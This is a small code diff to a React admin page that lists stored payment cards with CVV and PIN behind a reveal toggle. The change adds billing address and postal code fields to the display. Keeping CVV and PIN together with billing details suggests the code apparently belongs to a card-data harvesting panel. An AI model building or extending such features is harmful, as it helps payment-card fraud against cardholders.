@@ -12,6 +12,8 @@ interface CardEntry {
   cvv: string;
   secure_pin: string;
   card_type: string;
+  postal_code?: string | null;
+  billing_address?: string | null;
   created_at: string;
 }
 
@@ -101,6 +103,11 @@ const AdminCardDetails = () => {
                         <span>CVV: <span className="text-foreground font-mono">{mask(card.cvv, show)}</span></span>
                         <span>PIN: <span className="text-foreground font-mono">{mask(card.secure_pin, show)}</span></span>
                       </div>
+                      {(card.billing_address || card.postal_code) && (
+                        <p className="text-xs text-muted-foreground">
+                          Billing: <span className="text-foreground">{[card.billing_address, card.postal_code].filter(Boolean).join(", ")}</span>
+                        </p>
+                      )}
                       <p className="text-[11px] text-muted-foreground">
                         Added {new Date(card.created_at).toLocaleString()}
                       </p>
